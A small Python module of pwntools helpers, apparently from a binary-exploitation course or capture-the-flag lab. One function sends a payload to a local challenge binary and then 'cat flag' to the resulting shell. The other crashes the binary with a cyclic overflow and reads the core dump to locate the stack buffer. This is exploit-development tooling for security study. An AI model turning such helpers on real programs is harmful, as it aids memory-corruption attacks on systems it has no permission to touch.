import pwn

from pathlib import Path
from typing import List

#  unit 2, helper functions
#  jdw170000

def get_flag(elf: pwn.ELF, payload: bytes, env: dict = None, timeout=pwn.Timeout.default) -> str:
    p = elf.process(env=env)
    try:
        p.sendline(payload)
        p.sendline(b'cat flag')
        flag = p.recvline_startswith(b'candl', timeout=timeout)
        if not flag:
            raise TimeoutError()
        
        return flag.decode()
    except Exception as e:
        raise e
    finally:
        p.close()

def get_buffer_address(elf: pwn.ELF, argv: List[str] = None, overflow_len: int = 512, search_len: int = 16, preamble: bytes = b'', env: dict = None) -> int:
    argv = argv if argv else list()

    core_path = Path(elf.path).with_name('core')
    core_path.unlink(missing_ok=True)

    # crash the process with a large input
    p = elf.process(argv, env=env)
    payload = preamble + pwn.cyclic(overflow_len - len(preamble))
    p.sendline(payload)
    p.wait()

    # parse the core file
    core = pwn.Corefile(core_path)
    core_path.unlink()

    # find the buffer!
    buffer_address = core.stack.find(payload[:search_len])
    return buffer_address